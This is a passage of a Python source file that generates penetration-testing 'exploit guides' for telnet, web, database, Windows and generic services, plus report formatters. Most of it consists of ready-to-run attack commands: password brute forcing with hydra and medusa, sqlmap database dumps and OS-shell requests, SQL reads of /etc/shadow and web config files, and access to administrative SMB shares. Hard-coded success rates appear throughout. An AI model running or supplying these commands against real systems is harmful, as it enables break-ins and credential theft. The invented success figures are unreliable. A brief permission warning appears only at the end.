                    "description": "Once we're in, we need to understand the system and look for privilege escalation opportunities.",
                    "commands": [
                        "whoami",
                        "uname -a",
                        "cat /etc/passwd",
                        "ps aux",
                        "netstat -tuln"
                    ],
                    "notes": "Check what user we are, what OS we're on, and what other services might be running. Look for processes running as root that we might be able to exploit."
                }
            ],
            "tips": [
                "Telnet is completely unencrypted - everything is transmitted in plain text",
                "Look for telnet configuration files that might reveal additional information",
                "Some telnet services have backdoors or default credentials",
                "Check if telnet is configured to allow root login directly",
                "Don't forget to look for telnet logs that might contain credentials"
            ],
            "common_mistakes": [
                "Not trying direct connection first",
                "Forgetting that telnet traffic is unencrypted",
                "Not checking for default credentials",
                "Ignoring banner information that might reveal system details"
            ]
        }
        
        return guide
    
    def _generate_web_human_guide(self, service: str, port: str, version: str, banner: str, vulnerabilities: List[Dict]) -> Dict:
        """Generate a humanized web exploitation guide."""
        
        protocol = "https" if service == "https" else "http"
        intro = f"Web server on port {port} - this is where the real fun begins! Web applications are like Swiss cheese - full of holes if you know where to look. Let's see what we can find."
        
        guide = {
            "service": service,
            "port": port,
            "title": f"{service.upper()} Web Exploitation Guide - Port {port}",
            "difficulty": "Medium to High",
            "estimated_time": "45-90 minutes",
            "success_rate": "60-80%",
            "description": intro,
            "steps": [
                {
                    "step": 1,
                    "title": "Initial Reconnaissance",
                    "description": "First, let's see what we're dealing with. Web servers can reveal a lot of information if you know how to ask.",
                    "commands": [
                        f"curl -I {protocol}://TARGET_IP:{port}",
                        f"whatweb {protocol}://TARGET_IP:{port}",
                        f"nikto -h {protocol}://TARGET_IP:{port}",
                        f"dirb {protocol}://TARGET_IP:{port}"
                    ],
                    "notes": "The HTTP headers will tell us what server software is running. WhatWeb is great for fingerprinting web technologies. Nikto will find common vulnerabilities automatically."
                },
                {
                    "step": 2,
                    "title": "Directory and File Enumeration",
                    "description": "Web servers often have hidden files and directories that contain sensitive information.",
                    "commands": [
                        f"gobuster dir -u {protocol}://TARGET_IP:{port} -w /usr/share/wordlists/dirb/common.txt",
                        f"gobuster dir -u {protocol}://TARGET_IP:{port} -w /usr/share/wordlists/dirb/big.txt -x php,html,txt",
                        f"dirb {protocol}://TARGET_IP:{port} /usr/share/dirb/wordlists/common.txt",
                        f"wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {protocol}://TARGET_IP:{port}/FUZZ"
                    ],
                    "notes": "Look for admin panels, backup files, configuration files, and hidden directories. Common finds include /admin, /backup, /config, /phpinfo.php, /robots.txt."
                },
                {
                    "step": 3,
                    "title": "Parameter Discovery and Testing",
                    "description": "Now we need to find input points where we can inject our payloads.",
                    "commands": [
                        f"gobuster dir -u {protocol}://TARGET_IP:{port} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt",
                        f"arjun -u {protocol}://TARGET_IP:{port}",
                        f"paramspider -d TARGET_IP -l {protocol}://TARGET_IP:{port}"
                    ],
                    "notes": "Look for URLs with parameters like ?id=, ?page=, ?user=, ?search=. These are prime targets for injection attacks."
                },
                {
                    "step": 4,
                    "title": "SQL Injection Testing",
                    "description": "SQL injection is one of the most common and devastating web vulnerabilities.",
                    "commands": [
                        f"sqlmap -u '{protocol}://TARGET_IP:{port}/page.php?id=1' --dbs",
                        f"sqlmap -u '{protocol}://TARGET_IP:{port}/page.php?id=1' -D database_name --tables",
                        f"sqlmap -u '{protocol}://TARGET_IP:{port}/page.php?id=1' -D database_name -T users --dump",
                        f"sqlmap -u '{protocol}://TARGET_IP:{port}/page.php?id=1' --os-shell"
                    ],
                    "notes": "Start with basic SQL injection tests. If you find a vulnerable parameter, sqlmap can automate the entire exploitation process."
                },
                {
                    "step": 5,
                    "title": "XSS and Other Web Vulnerabilities",
                    "description": "Cross-site scripting and other web vulnerabilities can be just as dangerous as SQL injection.",
                    "commands": [
                        f"xsser --url '{protocol}://TARGET_IP:{port}/page.php?param=1'",
                        f"xsstrike -u '{protocol}://TARGET_IP:{port}/page.php?param=1'",
                        f"nikto -h {protocol}://TARGET_IP:{port} -Tuning 1,2,3,4,5,6,7,8,9,0,a,b,c"
                    ],
                    "notes": "Test for XSS, CSRF, file inclusion, and other web vulnerabilities. Don't forget to check for file upload vulnerabilities."
                },
                {
                    "step": 6,
                    "title": "Authentication Bypass and Brute Force",
                    "description": "If we find login forms, we need to try to bypass authentication or brute force credentials.",
                    "commands": [
                        f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {protocol}-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
                        f"medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin",
                        f"patator http_fuzz url={protocol}://TARGET_IP:{port}/login.php method=POST body='username=FILE0&password=FILE1' 0=/usr/share/wordlists/metasploit/unix_users.txt 1=/usr/share/wordlists/rockyou.txt"
                    ],
                    "notes": "Try common credentials first: admin/admin, admin/password, admin/123456. Look for SQL injection in login forms that might bypass authentication entirely."
                }
            ],
            "tips": [
                "Always check the source code of web pages for hidden comments or information",
                "Look for backup files with extensions like .bak, .old, .backup",
                "Check robots.txt for hidden directories",
                "Don't forget to test for file inclusion vulnerabilities",
                "Look for error messages that might reveal system information"
            ],
            "common_mistakes": [
                "Not checking for hidden files and directories",
                "Forgetting to test for file upload vulnerabilities",
                "Not looking at the source code of web pages",
                "Ignoring error messages that might reveal information"
            ]
        }
        
        return guide
    
    def _generate_database_human_guide(self, service: str, port: str, version: str, banner: str, vulnerabilities: List[Dict]) -> Dict:
        """Generate a humanized database exploitation guide."""
        
        intro = f"{service.upper()} database on port {port} - databases are treasure troves of sensitive information. Let's see what we can extract."
        
        guide = {
            "service": service,
            "port": port,
            "title": f"{service.upper()} Database Exploitation Guide - Port {port}",
            "difficulty": "Medium",
            "estimated_time": "30-60 minutes",
            "success_rate": "50-70%",
            "description": intro,
            "steps": [
                {
                    "step": 1,
                    "title": "Direct Connection Test",
                    "description": "First, let's try connecting directly to the database. Sometimes they're configured with weak or default credentials.",
                    "commands": [
                        f"{service} -h TARGET_IP -u root -p",
                        f"{service} -h TARGET_IP -u admin -p",
                        f"{service} -h TARGET_IP -u root -p''",
                        f"nc -v TARGET_IP {port}"
                    ],
                    "notes": "Try common credentials like root/(empty), root/root, admin/admin. Some databases allow anonymous access."
                },
                {
                    "step": 2,
                    "title": "Credential Brute Force",
                    "description": "If direct connection doesn't work, we need to brute force the credentials.",
                    "commands": [
                        f"hydra -l root -P /usr/share/wordlists/rockyou.txt {service}://TARGET_IP",
                        f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {service}://TARGET_IP",
                        f"medusa -h TARGET_IP -u root -P /usr/share/wordlists/rockyou.txt -M {service}"
                    ],
                    "notes": "Database credentials are often weak. Common passwords include: (empty), root, admin, password, 123456."
                },
                {
                    "step": 3,
                    "title": "Database Enumeration",
                    "description": "Once we're in, we need to explore the database structure and find sensitive data.",
                    "commands": [
                        f"{service} -h TARGET_IP -u root -p -e 'SHOW DATABASES;'",
                        f"{service} -h TARGET_IP -u root -p -e 'USE mysql; SHOW TABLES;'",
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT User,Host FROM mysql.user;'"
                    ],
                    "notes": "Look for databases containing user information, passwords, or other sensitive data. The mysql database contains user accounts and privileges."
                },
                {
                    "step": 4,
                    "title": "Data Extraction",
                    "description": "Now we extract the valuable data - user accounts, passwords, and other sensitive information.",
                    "commands": [
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT * FROM users;'",
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT username,password FROM users;'",
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT * FROM admin;'"
                    ],
                    "notes": "Look for password hashes that we can crack offline. Common table names include: users, admin, accounts, members, customers."
                },
                {
                    "step": 5,
                    "title": "Privilege Escalation",
                    "description": "Databases often have file system access that we can use to read sensitive files.",
                    "commands": [
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT LOAD_FILE(\"/etc/passwd\");'",
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT LOAD_FILE(\"/etc/shadow\");'",
                        f"{service} -h TARGET_IP -u root -p -e 'SELECT LOAD_FILE(\"/var/www/html/config.php\");'"
                    ],
                    "notes": "If the database user has FILE privilege, we can read system files. This can reveal user accounts, password hashes, and configuration files."
                }
            ],
            "tips": [
                "Look for database configuration files that might contain credentials",
                "Check if the database user has FILE privilege for file system access",
                "Don't forget to look for database backup files",
                "Some databases allow command execution through stored procedures"
            ],
            "common_mistakes": [
                "Not trying default credentials first",
                "Forgetting to check for database backup files",
                "Not looking for configuration files with credentials",
                "Ignoring the possibility of file system access"
            ]
        }
        
        return guide
    
    def _generate_windows_human_guide(self, service: str, port: str, version: str, banner: str, vulnerabilities: List[Dict]) -> Dict:
        """Generate a humanized Windows service exploitation guide."""
        
        intro = f"{service.upper()} on port {port} - this is a Windows service, which means we're dealing with a Windows machine. Windows services can be surprisingly vulnerable if you know the right techniques."
        
        guide = {
            "service": service,
            "port": port,
            "title": f"{service.upper()} Windows Exploitation Guide - Port {port}",
            "difficulty": "Medium to High",
            "estimated_time": "45-90 minutes",
            "success_rate": "40-70%",
            "description": intro,
            "steps": [
                {
                    "step": 1,
                    "title": "Service Enumeration",
                    "description": "First, let's understand what we're dealing with. Windows services can reveal a lot about the system.",
                    "commands": [
                        f"nmap -sV -p {port} TARGET_IP",
                        f"enum4linux TARGET_IP",
                        f"nmap --script smb-enum-shares -p {port} TARGET_IP",
                        f"nmap --script smb-enum-users -p {port} TARGET_IP"
                    ],
                    "notes": "Enum4linux is a great tool for Windows enumeration. It will show us users, shares, and other useful information."
                },
                {
                    "step": 2,
                    "title": "Anonymous Access Test",
                    "description": "Windows services sometimes allow anonymous access, which is a huge security hole.",
                    "commands": [
                        f"smbclient -L //TARGET_IP -N",
                        f"smbclient //TARGET_IP/share -N",
                        f"rdesktop TARGET_IP",
                        f"xfreerdp /v:TARGET_IP /u:'' /p:''"
                    ],
                    "notes": "Try connecting without credentials first. Some Windows systems are configured to allow anonymous access to shares."
                },
                {
                    "step": 3,
                    "title": "Credential Brute Force",
                    "description": "If anonymous access doesn't work, we need to brute force credentials.",
                    "commands": [
                        f"hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://TARGET_IP",
                        f"hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://TARGET_IP",
                        f"medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M smbnt"
                    ],
                    "notes": "Common Windows usernames: administrator, admin, guest, test. Common passwords: (empty), password, admin, 123456."
                },
                {
                    "step": 4,
                    "title": "Share Enumeration and Access",
                    "description": "Once we have access, we need to explore the shares and look for sensitive files.",
                    "commands": [
                        f"smbclient //TARGET_IP/C$ -U username%password",
                        f"smbclient //TARGET_IP/ADMIN$ -U username%password",
                        f"smbclient //TARGET_IP/IPC$ -U username%password"
                    ],
                    "notes": "C$ is the C drive, ADMIN$ is the Windows directory, IPC$ is for inter-process communication. Look for sensitive files in these shares."
                },
                {
                    "step": 5,
                    "title": "Privilege Escalation",
                    "description": "Windows privilege escalation often involves finding misconfigured services or weak permissions.",
                    "commands": [
                        "whoami /priv",
                        "net user",
                        "net localgroup administrators",
                        "wmic qfe list brief",
                        "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                    ],
                    "notes": "Check what privileges we have and look for ways to escalate. Common techniques include exploiting weak service permissions or finding stored credentials."
                }
            ],
            "tips": [
                "Look for stored credentials in the registry",
                "Check for weak service permissions",
                "Don't forget to look for scheduled tasks",
                "Check for unquoted service paths",
                "Look for DLL hijacking opportunities"
            ],
            "common_mistakes": [
                "Not trying anonymous access first",
                "Forgetting to check for stored credentials",
                "Not looking for weak service permissions",
                "Ignoring the registry for stored information"
            ]
        }
        
        return guide
    
    def _generate_generic_human_guide(self, service: str, port: str, version: str, banner: str, vulnerabilities: List[Dict]) -> Dict:
        """Generate a humanized generic exploitation guide."""
        
        intro = f"{service.upper()} on port {port} - this is an interesting service. Let's see what we can do with it."
        
        guide = {
            "service": service,
            "port": port,
            "title": f"{service.upper()} Generic Exploitation Guide - Port {port}",
            "difficulty": "Unknown",
            "estimated_time": "30-60 minutes",
            "success_rate": "30-50%",
            "description": intro,
            "steps": [
                {
                    "step": 1,
                    "title": "Service Fingerprinting",
                    "description": "First, let's understand what this service is and how it works.",
                    "commands": [
                        f"nmap -sV -p {port} TARGET_IP",
                        f"nc -v TARGET_IP {port}",
                        f"telnet TARGET_IP {port}"
                    ],
                    "notes": "Try connecting directly to see what the service responds with. This can reveal version information and potential vulnerabilities."
                },
                {
                    "step": 2,
                    "title": "Research and Enumeration",
                    "description": "We need to research this service and understand its common vulnerabilities.",
                    "commands": [
                        f"searchsploit {service}",
                        f"nmap --script vuln -p {port} TARGET_IP",
                        f"nmap --script {service}-* -p {port} TARGET_IP"
                    ],
                    "notes": "Search for known exploits for this service. Nmap scripts can reveal common vulnerabilities."
                },
                {
                    "step": 3,
                    "title": "Default Credentials and Brute Force",
                    "description": "Try default credentials and brute force if authentication is required.",
                    "commands": [
                        f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {service}://TARGET_IP",
                        f"medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M {service}"
                    ],
                    "notes": "Many services have default credentials. Common ones include admin/admin, root/root, admin/password."
                },
                {
                    "step": 4,
                    "title": "Manual Testing",
                    "description": "Sometimes manual testing reveals vulnerabilities that automated tools miss.",
                    "commands": [
                        f"nc -v TARGET_IP {port}",
                        f"telnet TARGET_IP {port}",
                        f"openssl s_client -connect TARGET_IP:{port}"
                    ],
                    "notes": "Manual testing can reveal input validation issues, buffer overflows, or other vulnerabilities."
                },
                {
                    "step": 5,
                    "title": "Documentation and Reporting",
                    "description": "Document your findings and any successful exploitation.",
                    "commands": [
                        "echo 'Service: {service}' > exploitation_report.txt",
                        "echo 'Port: {port}' >> exploitation_report.txt",
                        "echo 'Vulnerabilities found:' >> exploitation_report.txt"
                    ],
                    "notes": "Always document your findings. This helps with reporting and future reference."
                }
            ],
            "tips": [
                "Research the service thoroughly before attempting exploitation",
                "Look for default configurations and credentials",
                "Check for known vulnerabilities in the service version",
                "Don't forget to document your findings"
            ],
            "common_mistakes": [
                "Not researching the service before attempting exploitation",
                "Forgetting to try default credentials",
                "Not documenting findings and techniques",
                "Ignoring manual testing in favor of automated tools only"
            ]
        }
        
        return guide
    
    def _get_required_tools(self, scan_results: Dict, vulnerabilities: List[Dict]) -> List[str]:
        """Get all required tools for the attack chain."""
        tools = set()
        
        # Add reconnaissance tools
        tools.update(['nmap', 'masscan'])
        
        # Add service-specific tools
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        for service in services:
            if service in self.service_attack_chains:
                tools.update(self._get_service_tools(service))
        
        # Add vulnerability-specific tools
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type in self.vulnerability_exploits:
                tools.update(self.vulnerability_exploits[vuln_type]['tools'])
        
        # Add post-exploitation tools
        tools.update(['mimikatz', 'hashcat', 'john', 'linpeas', 'winpeas'])
        
        return list(tools)
    
    def _get_service_tools(self, service: str) -> List[str]:
        """Get tools for a specific service."""
        service_tools = {
            'ssh': ['hydra', 'medusa', 'patator'],
            'ftp': ['hydra', 'medusa', 'patator'],
            'http': ['dirb', 'gobuster', 'nikto', 'sqlmap', 'burp_suite'],
            'https': ['dirb', 'gobuster', 'nikto', 'sqlmap', 'burp_suite'],
            'mysql': ['mysql', 'hydra', 'medusa'],
            'postgresql': ['psql', 'hydra', 'medusa'],
            'smb': ['smbclient', 'enum4linux', 'hydra'],
            'rdp': ['xfreerdp', 'rdesktop', 'hydra'],
            'telnet': ['telnet', 'hydra', 'medusa'],
            'smtp': ['smtp-user-enum', 'hydra'],
            'pop3': ['hydra', 'medusa'],
            'imap': ['hydra', 'medusa'],
            'dns': ['nslookup', 'dig'],
            'snmp': ['snmpwalk', 'snmp-check'],
            'ldap': ['ldapsearch'],
            'kerberos': ['kinit', 'klist'],
            'vnc': ['vncviewer', 'hydra'],
            'redis': ['redis-cli'],
            'mongodb': ['mongo'],
            'elasticsearch': ['curl'],
            'docker': ['docker'],
            'kubernetes': ['kubectl'],
            'jenkins': ['curl', 'burp_suite'],
            'gitlab': ['curl', 'burp_suite'],
            'wordpress': ['wpscan', 'burp_suite'],
            'joomla': ['joomscan', 'burp_suite'],
            'drupal': ['droopescan', 'burp_suite']
        }
        
        return service_tools.get(service, ['nmap', 'metasploit'])
    
    def _estimate_attack_duration(self, scan_results: Dict, vulnerabilities: List[Dict]) -> str:
        """Estimate the total duration of the attack chain."""
        base_time = 60  # Base time in minutes
        
        # Add time for each service
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        for service in services:
            if service in ['ssh', 'http', 'https', 'mysql', 'smb']:
                base_time += 30
            else:
                base_time += 15
        
        # Add time for each vulnerability
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type in ['rce', 'sql_injection']:
                base_time += 45
            elif vuln_type in ['xss', 'lfi']:
                base_time += 30
            else:
                base_time += 20
        
        return f"{base_time}-{base_time * 2} minutes"
    
    def _calculate_success_probability(self, scan_results: Dict, vulnerabilities: List[Dict]) -> str:
        """Calculate the probability of successful attack."""
        probability = 50  # Base probability
        
        # Adjust based on services
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        for service in services:
            if service in ['ftp', 'telnet', 'smtp']:
                probability += 20  # High success rate
            elif service in ['ssh', 'http', 'https']:
                probability += 10  # Medium success rate
            elif service in ['rdp', 'smb']:
                probability += 15  # Medium-high success rate
        
        # Adjust based on vulnerabilities
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type in ['rce', 'sql_injection']:
                probability += 25  # High impact
            elif vuln_type in ['xss', 'lfi']:
                probability += 15  # Medium impact
            elif vuln_type in ['weak_credentials', 'misconfiguration']:
                probability += 20  # High success rate
        
        # Cap at 95%
        probability = min(probability, 95)
        
        if probability >= 80:
            return "High"
        elif probability >= 60:
            return "Medium"
        else:
            return "Low"
    
    def _assess_attack_risk(self, scan_results: Dict, vulnerabilities: List[Dict]) -> Dict:
        """Assess the risk level of the attack."""
        risk_factors = []
        risk_score = 0
        
        # Assess based on services
        services = [s.get('service', '').lower() for s in scan_results.get('open_ports', [])]
        for service in services:
            if service in ['ftp', 'telnet']:
                risk_factors.append("Unencrypted services detected")
                risk_score += 3
            elif service in ['ssh', 'http', 'https']:
                risk_score += 2
            elif service in ['rdp', 'smb']:
                risk_factors.append("Windows services detected")
                risk_score += 2
        
        # Assess based on vulnerabilities
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type in ['rce', 'sql_injection']:
                risk_factors.append("Critical vulnerabilities detected")
                risk_score += 4
            elif vuln_type in ['xss', 'lfi']:
                risk_factors.append("Web vulnerabilities detected")
                risk_score += 3
            elif vuln_type in ['weak_credentials', 'misconfiguration']:
                risk_factors.append("Configuration issues detected")
                risk_score += 2
        
        # Determine risk level
        if risk_score >= 8:
            risk_level = "Critical"
        elif risk_score >= 6:
            risk_level = "High"
        elif risk_score >= 4:
            risk_level = "Medium"
        else:
            risk_level = "Low"
        
        return {
            "level": risk_level,
            "score": risk_score,
            "factors": risk_factors
        }
    
    def format_comprehensive_attack_chain(self, attack_chain: Dict) -> str:
        """Format the comprehensive attack chain into a detailed report."""
        output = []
        
        # Header
        output.append("=" * 100)
        output.append(attack_chain["title"])
        output.append("=" * 100)
        
        # Target Information
        target_info = attack_chain["target_info"]
        output.append(f"\nðŸŽ¯ TARGET INFORMATION:")
        output.append(f"   ðŸ“ IP Address: {target_info['ip']}")
        output.append(f"   ðŸ”Œ Open Ports: {target_info['open_ports']} ({', '.join(map(str, target_info['ports']))})")
        output.append(f"   ðŸš¨ Vulnerabilities: {target_info['vulnerabilities']}")
        output.append(f"   ðŸ’» OS: {target_info['os_info']}")
        output.append(f"   ðŸ• Scan Time: {target_info['scan_time']}")
        
        # Risk Assessment
        risk = attack_chain["risk_assessment"]
        output.append(f"\nâš ï¸  RISK ASSESSMENT:")
        output.append(f"   ðŸš¨ Level: {risk['level']}")
        output.append(f"   ðŸ“Š Score: {risk['score']}/10")
        output.append(f"   ðŸ“‹ Factors:")
        for factor in risk['factors']:
            output.append(f"      â€¢ {factor}")
        
        # Attack Phases
        phases = attack_chain["phases"]
        output.append(f"\nðŸ”§ ATTACK PHASES:")
        
        for phase_name, phase_data in phases.items():
            output.append(f"\nðŸ“‹ {phase_name.upper().replace('_', ' ')}:")
            output.append(f"   ðŸ“ Description: {phase_data['description']}")
            output.append(f"   ðŸŽ¯ Objectives:")
            for objective in phase_data['objectives']:
                output.append(f"      â€¢ {objective}")
            output.append(f"   â±ï¸  Estimated Time: {phase_data['estimated_time']}")
            
            if 'tools' in phase_data:
                output.append(f"   ðŸ› ï¸  Tools: {', '.join(phase_data['tools'])}")
            
            if 'commands' in phase_data and phase_data['commands']:
                output.append(f"   ðŸ’» Commands:")
                for cmd in phase_data['commands'][:5]:  # Show first 5 commands
                    output.append(f"      $ {cmd}")
                if len(phase_data['commands']) > 5:
                    output.append(f"      ... and {len(phase_data['commands']) - 5} more commands")
            
            if 'service_attacks' in phase_data:
                output.append(f"   ðŸŽ¯ Service Attacks:")
                for attack in phase_data['service_attacks']:
                    output.append(f"      â€¢ {attack['service'].upper()}: {attack['description']}")
            
            if 'vulnerability_exploits' in phase_data:
                output.append(f"   ðŸš¨ Vulnerability Exploits:")
                for exploit in phase_data['vulnerability_exploits']:
                    output.append(f"      â€¢ {exploit['vulnerability']}: {exploit['description']}")
            
            if 'human_exploit_guides' in phase_data and phase_data['human_exploit_guides']:
                output.append(f"   ðŸ“ Human Exploit Guides:")
                for guide in phase_data['human_exploit_guides']:
                    output.append(f"      â€¢ {guide['title']} ({guide['difficulty']})")
                    output.append(f"        Success Rate: {guide['success_rate']}")
                    output.append(f"        Time: {guide['estimated_time']}")
        
        # Overall Assessment
        output.append(f"\nðŸ“Š OVERALL ASSESSMENT:")
        output.append(f"   â±ï¸  Estimated Duration: {attack_chain['estimated_duration']}")
        output.append(f"   ðŸŽ¯ Success Probability: {attack_chain['success_probability']}")
        output.append(f"   ðŸ› ï¸  Tools Required: {len(attack_chain['tools_required'])} tools")
        
        # Tools Required
        output.append(f"\nðŸ› ï¸  TOOLS REQUIRED:")
        for tool in sorted(attack_chain['tools_required']):
            output.append(f"   â€¢ {tool}")
        
        # Safety Warning
        output.append(f"\nâš ï¸  IMPORTANT WARNINGS:")
        output.append(f"   â€¢ Only test on systems you own or have explicit permission")
        output.append(f"   â€¢ Follow responsible disclosure practices")
        output.append(f"   â€¢ Be aware of legal implications")
        output.append(f"   â€¢ Use in controlled environments only")
        output.append(f"   â€¢ Document all activities for reporting")
        
        return "\n".join(output)

# Global instance for easy access
advanced_exploit_generator = AdvancedExploitGuideGenerator()

def generate_exploitation_guide(scan_results: Dict, vulnerabilities: List[Dict]) -> Dict:
    """Generate a comprehensive exploitation guide."""
    return advanced_exploit_generator.generate_comprehensive_attack_chain(scan_results, vulnerabilities)

def format_exploitation_guide(guide: Dict) -> str:
    """Format the exploitation guide into a detailed report."""
    return advanced_exploit_generator.format_comprehensive_attack_chain(guide)

def generate_quick_exploit_commands(guide: Dict) -> str:
    """Generate quick exploit commands for immediate use."""
    # This function is kept for backward compatibility
    # The new comprehensive guide includes all commands
    return "Use the comprehensive attack chain for detailed commands."

def format_human_exploit_guides(attack_chain: Dict) -> str:
    """Format the human exploit guides into detailed, readable reports."""
    output = []
    
    # Get human exploit guides from the exploitation phase
    exploitation_phase = attack_chain.get('phases', {}).get('exploitation', {})
    human_guides = exploitation_phase.get('human_exploit_guides', [])
    
    if not human_guides:
        return "No human exploit guides available for this target."
    
    output.append("ðŸŽ¯ DETAILED HUMAN EXPLOIT GUIDES")
    output.append("=" * 80)
    
    for i, guide in enumerate(human_guides, 1):
        output.append(f"\nðŸ“‹ GUIDE {i}: {guide['title']}")
        output.append("-" * 60)
        
        # Service and port info
        output.append(f"ðŸŽ¯ Service: {guide['service'].upper()}")
        output.append(f"ðŸ”Œ Port: {guide['port']}")
        output.append(f"âš¡ Difficulty: {guide['difficulty']}")
        output.append(f"â±ï¸  Estimated Time: {guide['estimated_time']}")
        output.append(f"ðŸŽ¯ Success Rate: {guide['success_rate']}")
        
        # Description
        output.append(f"\nðŸ“ Description:")
        output.append(f"   {guide['description']}")
        
        # Steps
        output.append(f"\nðŸ”§ EXPLOITATION STEPS:")
        for step in guide['steps']:
            output.append(f"\n   Step {step['step']}: {step['title']}")
            output.append(f"   ðŸ“ {step['description']}")
            
            if step['commands']:
                output.append(f"   ðŸ’» Commands:")
                for cmd in step['commands']:
                    output.append(f"      $ {cmd}")
            
            if step.get('notes'):
                output.append(f"   ðŸ’¡ Notes: {step['notes']}")
        
        # Tips
        if guide.get('tips'):
            output.append(f"\nðŸ’¡ PRO TIPS:")
            for tip in guide['tips']:
                output.append(f"   â€¢ {tip}")
        
        # Common mistakes
        if guide.get('common_mistakes'):
            output.append(f"\nâš ï¸  COMMON MISTAKES TO AVOID:")
            for mistake in guide['common_mistakes']:
                output.append(f"   â€¢ {mistake}")
        
        output.append("\n" + "=" * 80)
    
    return "\n".join(output)
